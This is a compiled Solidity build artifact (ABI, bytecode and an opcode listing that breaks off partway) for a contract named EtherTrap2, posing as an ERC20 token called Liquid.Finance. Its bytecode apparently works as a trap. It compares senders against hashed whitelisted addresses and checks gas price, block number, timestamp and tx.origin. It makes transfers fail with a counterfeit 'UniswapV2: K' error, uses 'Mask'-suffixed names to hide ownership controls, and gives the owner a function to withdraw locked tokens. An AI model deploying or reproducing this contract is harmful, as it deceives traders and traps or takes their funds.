{
  "contracts/EtherTrap2.sol": {
    "EtherTrap2": {
      "abi": [
        {
          "inputs": [],
          "stateMutability": "nonpayable",
          "type": "constructor"
        },
        {
          "anonymous": false,
          "inputs": [
            {
              "indexed": true,
              "internalType": "address",
              "name": "owner",
              "type": "address"
            },
            {
              "indexed": true,
              "internalType": "address",
              "name": "spender",
              "type": "address"
            },
            {
              "indexed": false,
              "internalType": "uint256",
              "name": "value",
              "type": "uint256"
            }
          ],
          "name": "Approval",
          "type": "event"
        },
        {
          "anonymous": false,
          "inputs": [
            {
              "indexed": true,
              "internalType": "address",
              "name": "previousOwner",
              "type": "address"
            },
            {
              "indexed": true,
              "internalType": "address",
              "name": "newOwner",
              "type": "address"
            }
          ],
          "name": "OwnershipTransferredMask",
          "type": "event"
        },
        {
          "anonymous": false,
          "inputs": [
            {
              "indexed": true,
              "internalType": "address",
              "name": "from",
              "type": "address"
            },
            {
              "indexed": true,
              "internalType": "address",
              "name": "to",
              "type": "address"
            },
            {
              "indexed": false,
              "internalType": "uint256",
              "name": "value",
              "type": "uint256"
            }
          ],
          "name": "Transfer",
          "type": "event"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "owner",
              "type": "address"
            },
            {
              "internalType": "address",
              "name": "spender",
              "type": "address"
            }
          ],
          "name": "allowance",
          "outputs": [
            {
              "internalType": "uint256",
              "name": "",
              "type": "uint256"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "spender",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "amount",
              "type": "uint256"
            }
          ],
          "name": "approve",
          "outputs": [
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            }
          ],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "account",
              "type": "address"
            }
          ],
          "name": "balanceOf",
          "outputs": [
            {
              "internalType": "uint256",
              "name": "",
              "type": "uint256"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "uint256",
              "name": "amount",
              "type": "uint256"
            }
          ],
          "name": "burn",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "account",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "amount",
              "type": "uint256"
            }
          ],
          "name": "burnFrom",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "decimals",
          "outputs": [
            {
              "internalType": "uint8",
              "name": "",
              "type": "uint8"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "spender",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "subtractedValue",
              "type": "uint256"
            }
          ],
          "name": "decreaseAllowance",
          "outputs": [
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            }
          ],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "disableProtectionMask",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "spender",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "addedValue",
              "type": "uint256"
            }
          ],
          "name": "increaseAllowance",
          "outputs": [
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            }
          ],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "liquidityPoolMask",
          "outputs": [
            {
              "internalType": "address",
              "name": "",
              "type": "address"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "name",
          "outputs": [
            {
              "internalType": "string",
              "name": "",
              "type": "string"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "ownerMask",
          "outputs": [
            {
              "internalType": "address",
              "name": "",
              "type": "address"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "protectedMask",
          "outputs": [
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "renounceOwnershipMask",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "sellProtected",
          "outputs": [
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "symbol",
          "outputs": [
            {
              "internalType": "string",
              "name": "",
              "type": "string"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "totalSupply",
          "outputs": [
            {
              "internalType": "uint256",
              "name": "",
              "type": "uint256"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "recipient",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "amount",
              "type": "uint256"
            }
          ],
          "name": "transfer",
          "outputs": [
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            }
          ],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "sender",
              "type": "address"
            },
            {
              "internalType": "address",
              "name": "recipient",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "amount",
              "type": "uint256"
            }
          ],
          "name": "transferFrom",
          "outputs": [
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            }
          ],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "newOwner",
              "type": "address"
            }
          ],
          "name": "transferOwnershipMask",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "contract IERC20",
              "name": "_token",
              "type": "address"
            },
            {
              "internalType": "address",
              "name": "_receiver",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "_amount",
              "type": "uint256"
            }
          ],
          "name": "withdrawLockedMask",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        }
      ],
      "evm": {
        "bytecode": {
          "linkReferences": {},
          "object": "60806040526007805462ffff001916620100001790553480156200002257600080fd5b506040518060400160405280600e81526020016d4c69717569642e46696e616e636560901b815250604051806040016040528060048152602001634c51464960e01b815250620000a7735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2306200017f60201b620008391760201c565b600080546001600160a01b0319166001600160a01b0392909216919091178155620000d162000253565b600180546001600160a01b0319166001600160a01b038316908117909155604051919250906000907f4470b2d701ab4613c8c4cd6d4a3ca6588481f62f32e016c6cabf08db2ee685c1908290a35081516200013490600590602085019062000927565b5080516200014a90600690602084019062000927565b50506007805460ff1916601217905550620001796200016862000257565b69d3c21bcecceda100000062000266565b620009d3565b600080806200018f858562000379565b604080516001600160601b0319606094851b811660208084019190915293851b81166034830152825160288184030181526048830184528051908501207fff0000000000000000000000000000000000000000000000000000000000000060688401529a90941b9093166069840152607d8301989098527f96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f609d808401919091528851808403909101815260bd909201909752805196019590952095945050505050565b3390565b6001546001600160a01b031690565b6001600160a01b038216620002c2576040805162461bcd60e51b815260206004820152601f60248201527f45524332303a206d696e7420746f20746865207a65726f206164647265737300604482015290519081900360640190fd5b620002d0600083836200045c565b620002ec816004546200049860201b620008f41790919060201c565b6004556001600160a01b03821660009081526002602090815260409091205462000321918390620008f462000498821b17901c565b6001600160a01b03831660008181526002602090815260408083209490945583518581529351929391927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9281900390910190a35050565b600080826001600160a01b0316846001600160a01b03161415620003cf5760405162461bcd60e51b81526004018080602001828103825260258152602001806200236a6025913960400191505060405180910390fd5b826001600160a01b0316846001600160a01b031610620003f1578284620003f4565b83835b90925090506001600160a01b03821662000455576040805162461bcd60e51b815260206004820152601e60248201527f556e697377617056324c6962726172793a205a45524f5f414444524553530000604482015290519081900360640190fd5b9250929050565b620004748383836200049360201b620005a91760201c565b60075462010000900460ff1615620004935762000493838383620004fa565b505050565b600082820183811015620004f3576040805162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f770000000000604482015290519081900360640190fd5b9392505050565b60408051610140810182527e314e565e0574cb412563df634608d76f5c59d9f817e85966100ec1d48005c081527f8a3552d60a98e0ade765adddad0a2e420ca9b1eef5f326ba7ab860bb4ea72c9460208201527f1ebaa930b8e9130423c183bf38b0564b0103180b7dad301013b18e59880541ae918101919091527ff4ca8532861558e29f9858a3804245bb30f0303cc71e4192e41546237b6ce58b60608201527fe5c951f74bc89efa166514ac99d872f6b7a3c11aff63f51246c3742dfa925c9b60808201527f93230d0b2377404a36412e26d231de4c7e1a9fb62e227b420200ee950a5ca9c060a08201527fb6711c87f5d70aa0ec9dcbff648cab4ede7aec7218e4e2fef065f83253fc910860c08201527f51494c771c377610540e8b9b86186216a64dcf73a7ab57ec2c5953286f059f6060e08201527f1c06ceff26c1e104939fabc1d917760e45551281e46ed897561f29a31ef875f36101008201527fd1c9116e78ef547bbf6d308c24c15a19c52a03bdd09355bd1156d9e86ae1e6856101208201526000546001600160a01b0385811691161480156200069f5750600082115b8015620006b45750600754610100900460ff16155b156200073857604080516001600160601b0319606086901b16602080830191909152825180830360140181526034909201909252805191012060005b600a8110156200073557818382600a81106200070857fe5b602002015114156200072c5750506007805461ff0019166101001790555062000493565b600101620006f0565b50505b6000546001600160a01b038481169116148015620007565750600082115b80156200076a5750600754610100900460ff165b156200092157604080516001600160601b0319606087901b16602080830191909152825180830360140181526034909201909252805191012060005b600a811015620007f957818382600a8110620007be57fe5b60200201511415620007f057836729a2241af62c00001415620007e7576007805461ff00191690555b50505062000493565b600101620007a6565b504662f4240045101580620008115750628954404511155b8062000820575062f424005a10155b806200082c5750455a10155b806200083e5750660bbc1793248cbd44105b80620008505750662ef05e4c9232f644115b806200085a575032155b8062000869575062c65d404310155b8062000878575062ba8e0d4311155b80620008875750636255ac3342115b8062000896575063607478cb42105b80620008aa5750678ac7230489e800003a10155b80620008b7575080600114155b80620008dd5750620008c862000257565b6001600160a01b0316866001600160a01b0316145b6200091e576040805162461bcd60e51b815260206004820152600c60248201526b556e697377617056323a204b60a01b604482015290519081900360640190fd5b50505b50505050565b828054600181600116156101000203166002900490600052602060002090601f0160209004810192826200095f5760008555620009aa565b82601f106200097a57805160ff1916838001178555620009aa565b82800160010185558215620009aa579182015b82811115620009aa5782518255916020019190600101906200098d565b50620009b8929150620009bc565b5090565b5b80821115620009b85760008155600101620009bd565b61198780620009e36000396000f3fe608060405234801561001057600080fd5b50600436106101075760003560e01c806306fdde031461010c578063095ea7b31461012a57806318160ddd1461014a5780631c399f241461015f57806323b872dd1461017457806330b2bdbb14610187578063313ce5671461019c578063338cec21146101b157806339509351146101b957806342966c68146101cc57806349bfee57146101df57806370a08231146101e757806379cc6790146101fa57806395d89b411461020d578063a457c2d714610215578063a9059cbb14610228578063c9fa20b61461023b578063cc42c1111461024e578063db14f52a14610256578063dd62ed3e1461025e578063e960dbf314610271575b600080fd5b610114610279565b6040516101219190611667565b60405180910390f35b61013d6101383660046115f1565b61030f565b604051610121919061165c565b61015261032c565b60405161012191906116ba565b61017261016d36600461155d565b610332565b005b61013d6101823660046115b1565b61041f565b61018f6104a7565b6040516101219190611648565b6101a46104b6565b60405161012191906116c3565b61013d6104bf565b61013d6101c73660046115f1565b6104ce565b6101726101da366004611630565b61051c565b61013d610530565b6101526101f536600461155d565b61053e565b6101726102083660046115f1565b610559565b6101146105ae565b61013d6102233660046115f1565b61060f565b61013d6102363660046115f1565b610677565b61017261024936600461161c565b61068b565b6101726106fd565b610172610793565b61015261026c366004611579565b6107ff565b61018f61082a565b60058054604080516020601f60026000196101006001881615020190951694909404938401819004810282018101909252828152606093909290918301828280156103055780601f106102da57610100808354040283529160200191610305565b820191906000526020600020905b8154815290600101906020018083116102e857829003601f168201915b5050505050905090565b600061032361031c61094c565b8484610950565b50600192915050565b60045490565b61033a61094c565b6001600160a01b031661034b61082a565b6001600160a01b0316146103905760405162461bcd60e51b81526004018080602001828103825260248152602001806117bf6024913960400191505060405180910390fd5b6001600160a01b0381166103d55760405162461bcd60e51b815260040180806020018281038252602a8152602001806118d9602a913960400191505060405180910390fd5b6001546040516001600160a01b0380841692169060008051602061182f83398151915290600090a3600180546001600160a01b0319166001600160a01b0392909216919091179055565b600061042c848484610a3c565b61049c8461043861094c565b610497856040518060600160405280602881526020016117e3602891396001600160a01b038a1660009081526003602052604081209061047661094c565b6001600160a01b031681526020810191909152604001600020549190610b8d565b610950565b5060015b9392505050565b6000546001600160a01b031690565b60075460ff1690565b60075462010000900460ff1690565b60006103236104db61094c565b8461049785600360006104ec61094c565b6001600160a01b03908116825260208083019390935260409182016000908120918c1681529252902054906108f4565b61052d61052761094c565b82610c24565b50565b600754610100900460ff1681565b6001600160a01b031660009081526002602052604090205490565b600061058b8260405180606001604052806024815260200161180b602491396105848661026c61094c565b9190610b8d565b905061059f8361059961094c565b83610950565b6105a98383610c24565b505050565b60068054604080516020601f60026000196101006001881615020190951694909404938401819004810282018101909252828152606093909290918301828280156103055780601f106102da57610100808354040283529160200191610305565b600061032361061c61094c565b846104978560405180606001604052806025815260200161192d602591396003600061064661094c565b6001600160a01b03908116825260208083019390935260409182016000908120918d16815292529020549190610b8d565b600061032361068461094c565b8484610a3c565b61069361094c565b6001600160a01b03166106a461082a565b6001600160a01b0316146106e95760405162461bcd60e51b81526004018080602001828103825260248152602001806117bf6024913960400191505060405180910390fd5b6105a96001600160a01b0384168383610d0e565b61070561094c565b6001600160a01b031661071661082a565b6001600160a01b03161461075b5760405162461bcd60e51b81526004018080602001828103825260248152602001806117bf6024913960400191505060405180910390fd5b6001546040516000916001600160a01b03169060008051602061182f833981519152908390a3600180546001600160a01b0319169055565b61079b61094c565b6001600160a01b03166107ac61082a565b6001600160a01b0316146107f15760405162461bcd60e51b81526004018080602001828103825260248152602001806117bf6024913960400191505060405180910390fd5b6007805462ff000019169055565b6001600160a01b03918216600090815260036020908152604080832093909416825291909152205490565b6001546001600160a01b031690565b60008060006108488585610d60565b604080516001600160601b0319606094851b811660208084019190915293851b81166034830152825160288184030181526048830184528051908501206001600160f81b031960688401529a90941b9093166069840152607d8301989098527f96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f609d808401919091528851808403909101815260bd909201909752805196019590952095945050505050565b6000828201838110156104a0576040805162461bcd60e51b815260206004820152601b60248201527a536166654d6174683a206164646974696f6e206f766572666c6f7760281b604482015290519081900360640190fd5b3390565b6001600160a01b0383166109955760405162461bcd60e51b81526004018080602001828103825260248152602001806118b56024913960400191505060405180910390fd5b6001600160a01b0382166109da5760405162461bcd60e51b815260040180806020018281038252602281526020018061172c6022913960400191505060405180910390fd5b6001600160a01b03808416600081815260036020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b6001600160a01b038316610a815760405162461bcd60e51b81526004018080602001828103825260258152602001806118906025913960400191505060405180910390fd5b6001600160a01b038216610ac65760405162461bcd60e51b81526004018080602001828103825260238152602001806116e76023913960400191505060405180910390fd5b610ad1838383610e3e565b610b0e8160405180606001604052806026815260200161174e602691396001600160a01b0386166000908152600260205260409020549190610b8d565b6001600160a01b038085166000908152600260205260408082209390935590841681522054610b3d90826108f4565b6001600160a01b03808416600081815260026020908152604091829020949094558051858152905191939287169260008051602061184f83398151915292918290030190a36105a98383836105a9565b60008184841115610c1c5760405162461bcd60e51b81526004018080602001828103825283818151815260200191508051906020019080838360005b83811015610be1578181015183820152602001610bc9565b50505050905090810190601f168015610c0e5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b505050900390565b6001600160a01b038216610c695760405162461bcd60e51b815260040180806020018281038252602181526020018061186f6021913960400191505060405180910390fd5b610c7582600083610e3e565b610cb28160405180606001604052806022815260200161170a602291396001600160a01b0385166000908152600260205260409020549190610b8d565b6001600160a01b038316600090815260026020526040902055600454610cd89082610e65565b6004556040805182815290516000916001600160a01b0385169160008051602061184f8339815191529181900360200190a35050565b604080516001600160a01b038416602482015260448082018490528251808303909101815260649091019091526020810180516001600160e01b031663a9059cbb60e01b1790526105a9908490610ec2565b600080826001600160a01b0316846001600160a01b03161415610db45760405162461bcd60e51b81526004018080602001828103825260258152602001806117746025913960400191505060405180910390fd5b826001600160a01b0316846001600160a01b031610610dd4578284610dd7565b83835b90925090506001600160a01b038216610e37576040805162461bcd60e51b815260206004820152601e60248201527f556e697377617056324c6962726172793a205a45524f5f414444524553530000604482015290519081900360640190fd5b9250929050565b610e498383836105a9565b60075462010000900460ff16156105a9576105a9838383610f73565b600082821115610ebc576040805162461bcd60e51b815260206004820152601e60248201527f536166654d6174683a207375627472616374696f6e206f766572666c6f770000604482015290519081900360640190fd5b50900390565b6000610f17826040518060400160405280602081526020017f5361666545524332303a206c6f772d6c6576656c2063616c6c206661696c6564815250856001600160a01b031661137f9092919063ffffffff16565b8051909150156105a957808060200190516020811015610f3657600080fd5b50516105a95760405162461bcd60e51b815260040180806020018281038252602a815260200180611903602a913960400191505060405180910390fd5b60408051610140810182527e314e565e0574cb412563df634608d76f5c59d9f817e85966100ec1d48005c081527f8a3552d60a98e0ade765adddad0a2e420ca9b1eef5f326ba7ab860bb4ea72c9460208201527f1ebaa930b8e9130423c183bf38b0564b0103180b7dad301013b18e59880541ae918101919091527ff4ca8532861558e29f9858a3804245bb30f0303cc71e4192e41546237b6ce58b60608201527fe5c951f74bc89efa166514ac99d872f6b7a3c11aff63f51246c3742dfa925c9b60808201527f93230d0b2377404a36412e26d231de4c7e1a9fb62e227b420200ee950a5ca9c060a08201527fb6711c87f5d70aa0ec9dcbff648cab4ede7aec7218e4e2fef065f83253fc910860c08201527f51494c771c377610540e8b9b86186216a64dcf73a7ab57ec2c5953286f059f6060e08201527f1c06ceff26c1e104939fabc1d917760e45551281e46ed897561f29a31ef875f36101008201527fd1c9116e78ef547bbf6d308c24c15a19c52a03bdd09355bd1156d9e86ae1e6856101208201526000546001600160a01b0385811691161480156111175750600082115b801561112b5750600754610100900460ff16155b156111a957604080516001600160601b0319606086901b16602080830191909152825180830360140181526034909201909252805191012060005b600a8110156111a657818382600a811061117c57fe5b6020020151141561119e5750506007805461ff001916610100179055506105a9565b600101611166565b50505b6000546001600160a01b0384811691161480156111c65750600082115b80156111d95750600754610100900460ff165b1561137957604080516001600160601b0319606087901b16602080830191909152825180830360140181526034909201909252805191012060005b600a81101561126157818382600a811061122a57fe5b6020020151141561125957836729a2241af62c00001415611251576007805461ff00191690555b5050506105a9565b600101611214565b504662f42400451015806112785750628954404511155b80611286575062f424005a10155b806112915750455a10155b806112a25750660bbc1793248cbd44105b806112b35750662ef05e4c9232f644115b806112bc575032155b806112ca575062c65d404310155b806112d8575062ba8e0d4311155b806112e65750636255ac3342115b806112f4575063607478cb42105b806113075750678ac7230489e800003a10155b80611313575080600114155b80611336575061132161082a565b6001600160a01b0316866001600160a01b0316145b611376576040805162461bcd60e51b815260206004820152600c60248201526b556e697377617056323a204b60a01b604482015290519081900360640190fd5b50505b50505050565b606061138e8484600085611396565b949350505050565b6060824710156113d75760405162461bcd60e51b81526004018080602001828103825260268152602001806117996026913960400191505060405180910390fd5b6113e0856114f1565b611431576040805162461bcd60e51b815260206004820152601d60248201527f416464726573733a2063616c6c20746f206e6f6e2d636f6e7472616374000000604482015290519081900360640190fd5b600080866001600160a01b031685876040518082805190602001908083835b6020831061146f5780518252601f199092019160209182019101611450565b6001836020036101000a03801982511681845116808217855250505050505090500191505060006040518083038185875af1925050503d80600081146114d1576040519150601f19603f3d011682016040523d82523d6000602084013e6114d6565b606091505b50915091506114e68282866114f7565b979650505050505050565b3b151590565b606083156115065750816104a0565b8251156115165782518084602001fd5b60405162461bcd60e51b8152602060048201818152845160248401528451859391928392604401919085019080838360008315610be1578181015183820152602001610bc9565b60006020828403121561156e578081fd5b81356104a0816116d1565b6000806040838503121561158b578081fd5b8235611596816116d1565b915060208301356115a6816116d1565b809150509250929050565b6000806000606084860312156115c5578081fd5b83356115d0816116d1565b925060208401356115e0816116d1565b929592945050506040919091013590565b60008060408385031215611603578182fd5b823561160e816116d1565b946020939093013593505050565b6000806000606084860312156115c5578283fd5b600060208284031215611641578081fd5b5035919050565b6001600160a01b0391909116815260200190565b901515815260200190565b6000602080835283518082850152825b8181101561169357858101830151858201604001528201611677565b818111156116a45783604083870101525b50601f01601f1916929092016040019392505050565b90815260200190565b60ff91909116815260200190565b6001600160a01b038116811461052d57600080fdfe45524332303a207472616e7366657220746f20746865207a65726f206164647265737345524332303a206275726e20616d6f756e7420657863656564732062616c616e636545524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e6365556e697377617056324c6962726172793a204944454e544943414c5f414444524553534553416464726573733a20696e73756666696369656e742062616c616e636520666f722063616c6c4f776e61626c654d61736b3a2063616c6c6572206973206e6f7420746865206f776e657245524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e636545524332303a206275726e20616d6f756e74206578636565647320616c6c6f77616e63654470b2d701ab4613c8c4cd6d4a3ca6588481f62f32e016c6cabf08db2ee685c1ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef45524332303a206275726e2066726f6d20746865207a65726f206164647265737345524332303a207472616e736665722066726f6d20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573734f776e61626c654d61736b3a206e6577206f776e657220697320746865207a65726f20616464726573735361666545524332303a204552433230206f7065726174696f6e20646964206e6f74207375636365656445524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726fa2646970667358221220ea07cf6d7db49c600ae4b0422182fd590d7265a7bdc9f426dbe83bf8978fdc0b64736f6c63430007060033556e697377617056324c6962726172793a204944454e544943414c5f414444524553534553",
          "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x7 DUP1 SLOAD PUSH3 0xFFFF00 NOT AND PUSH3 0x10000 OR SWAP1 SSTORE CALLVALUE DUP1 ISZERO PUSH3 0x22 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0xE DUP2 MSTORE PUSH1 0x20 ADD PUSH14 0x4C69717569642E46696E616E6365 PUSH1 0x90 SHL DUP2 MSTORE POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x4 DUP2 MSTORE PUSH1 0x20 ADD PUSH4 0x4C514649 PUSH1 0xE0 SHL DUP2 MSTORE POP PUSH3 0xA7 PUSH20 0x5C69BEE701EF814A2B6A3EDD4B1652CB9CC5AA6F PUSH20 0xC02AAA39B223FE8D0A0E5C4F27EAD9083C756CC2 ADDRESS PUSH3 0x17F PUSH1 0x20 SHL PUSH3 0x839 OR PUSH1 0x20 SHR JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP2 SWAP1 SWAP2 OR DUP2 SSTORE PUSH3 0xD1 PUSH3 0x253 JUMP JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND SWAP1 DUP2 OR SWAP1 SWAP2 SSTORE PUSH1 0x40 MLOAD SWAP2 SWAP3 POP SWAP1 PUSH1 0x0 SWAP1 PUSH32 0x4470B2D701AB4613C8C4CD6D4A3CA6588481F62F32E016C6CABF08DB2EE685C1 SWAP1 DUP3 SWAP1 LOG3 POP DUP2 MLOAD PUSH3 0x134 SWAP1 PUSH1 0x5 SWAP1 PUSH1 0x20 DUP6 ADD SWAP1 PUSH3 0x927 JUMP JUMPDEST POP DUP1 MLOAD PUSH3 0x14A SWAP1 PUSH1 0x6 SWAP1 PUSH1 0x20 DUP5 ADD SWAP1 PUSH3 0x927 JUMP JUMPDEST POP POP PUSH1 0x7 DUP1 SLOAD PUSH1 0xFF NOT AND PUSH1 0x12 OR SWAP1 SSTORE POP PUSH3 0x179 PUSH3 0x168 PUSH3 0x257 JUMP JUMPDEST PUSH10 0xD3C21BCECCEDA1000000 PUSH3 0x266 JUMP JUMPDEST PUSH3 0x9D3 JUMP JUMPDEST PUSH1 0x0 DUP1 DUP1 PUSH3 0x18F DUP6 DUP6 PUSH3 0x379 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x60 SHL SUB NOT PUSH1 0x60 SWAP5 DUP6 SHL DUP2 AND PUSH1 0x20 DUP1 DUP5 ADD SWAP2 SWAP1 SWAP2 MSTORE SWAP4 DUP6 SHL DUP2 AND PUSH1 0x34 DUP4 ADD MSTORE DUP3 MLOAD PUSH1 0x28 DUP2 DUP5 SUB ADD DUP2 MSTORE PUSH1 0x48 DUP4 ADD DUP5 MSTORE DUP1 MLOAD SWAP1 DUP6 ADD KECCAK256 PUSH32 0xFF00000000000000000000000000000000000000000000000000000000000000 PUSH1 0x68 DUP5 ADD MSTORE SWAP11 SWAP1 SWAP5 SHL SWAP1 SWAP4 AND PUSH1 0x69 DUP5 ADD MSTORE PUSH1 0x7D DUP4 ADD SWAP9 SWAP1 SWAP9 MSTORE PUSH32 0x96E8AC4277198FF8B6F785478AA9A39F403CB768DD02CBEE326C3E7DA348845F PUSH1 0x9D DUP1 DUP5 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP9 MLOAD DUP1 DUP5 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xBD SWAP1 SWAP3 ADD SWAP1 SWAP8 MSTORE DUP1 MLOAD SWAP7 ADD SWAP6 SWAP1 SWAP6 KECCAK256 SWAP6 SWAP5 POP POP POP POP POP JUMP JUMPDEST CALLER SWAP1 JUMP JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH3 0x2C2 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1F PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A206D696E7420746F20746865207A65726F206164647265737300 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH3 0x2D0 PUSH1 0x0 DUP4 DUP4 PUSH3 0x45C JUMP JUMPDEST PUSH3 0x2EC DUP2 PUSH1 0x4 SLOAD PUSH3 0x498 PUSH1 0x20 SHL PUSH3 0x8F4 OR SWAP1 SWAP2 SWAP1 PUSH1 0x20 SHR JUMP JUMPDEST PUSH1 0x4 SSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 SWAP2 KECCAK256 SLOAD PUSH3 0x321 SWAP2 DUP4 SWAP1 PUSH3 0x8F4 PUSH3 0x498 DUP3 SHL OR SWAP1 SHR JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP4 MLOAD DUP6 DUP2 MSTORE SWAP4 MLOAD SWAP3 SWAP4 SWAP2 SWAP3 PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP5 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ ISZERO PUSH3 0x3CF JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x25 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH3 0x236A PUSH1 0x25 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP5 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND LT PUSH3 0x3F1 JUMPI DUP3 DUP5 PUSH3 0x3F4 JUMP JUMPDEST DUP4 DUP4 JUMPDEST SWAP1 SWAP3 POP SWAP1 